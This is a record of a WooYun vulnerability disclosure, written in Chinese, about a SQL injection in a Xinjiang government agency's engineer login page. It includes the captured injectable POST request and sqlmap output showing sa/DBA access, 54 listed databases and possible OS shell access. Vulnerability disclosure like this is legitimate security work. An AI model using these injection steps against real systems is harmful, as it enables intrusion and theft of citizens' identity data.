{"id": 68843, "wybug_id": "wooyun-2015-0138837", "wybug_title": "新疆某政府机构工程师管理系统post注入（sa用户DBA权限/54个数据库/可os-shell）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "牛 小 帅", "wybug_date": "2015-09-09 09:28", "wybug_open_date": "2015-10-26 13:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述： 阅兵场面震撼的我流泪了o(∩_∩)o 用身份证登入滴系统（猜测含身份证）包含个人用户、企业用户、二级建造师、管理员、临时二级建造师数据太庞大，未深入！ 详细说明：  网站地址\nhttp://**.**.**.**/\n管理系统登入地址\n**.**.**.**/jzs2/login/PersonLogin.aspx?usertype=1\n登入界面（可以看到由身份证等证件登入，所以应该有身份证数据，用户数据是必须的）\n\n抓post包数据\nPOST /jzs2/login/PersonLogin.aspx?usertype=1 HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: **.**.**.**/jzs2/login/PersonLogin.aspx?usertype=1Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 364__VIEWSTATE=%2FwEPDwUKMTQ1NjU0NDcyOGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgIFDEltYWdlYnV0dG9uMQUMSW1hZ2VCdXR0b24yRqtij9zZVP74%2FcHR0zz5dotN328%3D&__EVENTVALIDATION=%2FwEWCwKOh%2Bj7CQL%2Fz7tmAuS5k8YBAvu5k8YBAvq5k8YBAvm5k8YBAuXN394HAvTrhfkIAvLNz5QGAtLCmbQIAtLC1eQCSautoNF5qdLmVUfgqfi6zJkibiQ%3D&DDLType=0&TB_ID=1&TB_PSW=1&Imagebutton1.x=35&Imagebutton1.y=16\nsa用户DBA权限\n[18:12:30] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[18:12:30] [INFO] fetching current user[18:12:30] [INFO] resumed: sacurrent user:    'sa'\n54个数据库\navailable databases [54][*] Constructor_JZS2[*] Constructor_JZS21[*] Constructor_JZS2Temp[*] cxpt_jgc[*] DB_APZCRY_PIC[*] DB_APZCRY_XINJIANG[*] DB_AttachStorage_01[*] DB_WBServer_XINJIANG[*] ECMS[*] ETcredit_All[*] FS2.0[*] jgptDB[*] JiChaBan_XinJianq[*] JiChaBanWeb_XinJiang[*] jlry_peixunDB[*] jmsex[*] JzyDataBase[*] KSPX_DB[*] LZGISConfigTool[*] LZGISDataSource[*] LZMISWeb[*] manasi[*] master[*] model[*] msdb[*] muleix[*] PeiXun_zzq[*] PeiXun_zzqbak[*] PeiXun_zzqbak2[*] peixun_zzqtest[*] peixun_zzqtest1[*] qitaix[*] ReportOfData1[*] Safe[*] SafeTest[*] SanLei[*] SanLeiTest[*] SGarden[*] slry_peixunDB[*] tempdb[*] test[*] tzry_peixunDB[*] XJApproval[*] XJIACenter[*] xjjs[*] xjjsw_ywdb[*] xjjswebdb[*] XJReposalWeb[*] XJReposalWeb1[*] xjsgov[*] XJWSBS[*] XJYSBSDT[*] ZhuCeMana_InUse[*] Zzqlaobaotc_Website\n可以--os-shell\n\n到此为止  哈哈   漏洞证明：  网站地址\nhttp://**.**.**.**/\n管理系统登入地址\n**.**.**.**/jzs2/login/PersonLogin.aspx?usertype=1\n登入界面（可以看到由身份证等证件登入，所以应该有身份证数据，用户数据是必须的）\n\n抓post包数据\nPOST /jzs2/login/PersonLogin.aspx?usertype=1 HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: **.**.**.**/jzs2/login/PersonLogin.aspx?usertype=1Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 364__VIEWSTATE=%2FwEPDwUKMTQ1NjU0NDcyOGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgIFDEltYWdlYnV0dG9uMQUMSW1hZ2VCdXR0b24yRqtij9zZVP74%2FcHR0zz5dotN328%3D&__EVENTVALIDATION=%2FwEWCwKOh%2Bj7CQL%2Fz7tmAuS5k8YBAvu5k8YBAvq5k8YBAvm5k8YBAuXN394HAvTrhfkIAvLNz5QGAtLCmbQIAtLC1eQCSautoNF5qdLmVUfgqfi6zJkibiQ%3D&DDLType=0&TB_ID=1&TB_PSW=1&Imagebutton1.x=35&Imagebutton1.y=16\nsa用户DBA权限\n[18:12:30] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[18:12:30] [INFO] fetching current user[18:12:30] [INFO] resumed: sacurrent user:    'sa'\n54个数据库\navailable databases [54][*] Constructor_JZS2[*] Constructor_JZS21[*] Constructor_JZS2Temp[*] cxpt_jgc[*] DB_APZCRY_PIC[*] DB_APZCRY_XINJIANG[*] DB_AttachStorage_01[*] DB_WBServer_XINJIANG[*] ECMS[*] ETcredit_All[*] FS2.0[*] jgptDB[*] JiChaBan_XinJianq[*] JiChaBanWeb_XinJiang[*] jlry_peixunDB[*] jmsex[*] JzyDataBase[*] KSPX_DB[*] LZGISConfigTool[*] LZGISDataSource[*] LZMISWeb[*] manasi[*] master[*] model[*] msdb[*] muleix[*] PeiXun_zzq[*] PeiXun_zzqbak[*] PeiXun_zzqbak2[*] peixun_zzqtest[*] peixun_zzqtest1[*] qitaix[*] ReportOfData1[*] Safe[*] SafeTest[*] SanLei[*] SanLeiTest[*] SGarden[*] slry_peixunDB[*] tempdb[*] test[*] tzry_peixunDB[*] XJApproval[*] XJIACenter[*] xjjs[*] xjjsw_ywdb[*] xjjswebdb[*] XJReposalWeb[*] XJReposalWeb1[*] xjsgov[*] XJWSBS[*] XJYSBSDT[*] ZhuCeMana_InUse[*] Zzqlaobaotc_Website\n可以--os-shell\n\n到此为止 哈哈   修复方案：  waf过滤   版权声明：转载请注明来源 牛 小 帅@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-11 13:45 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给新疆分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}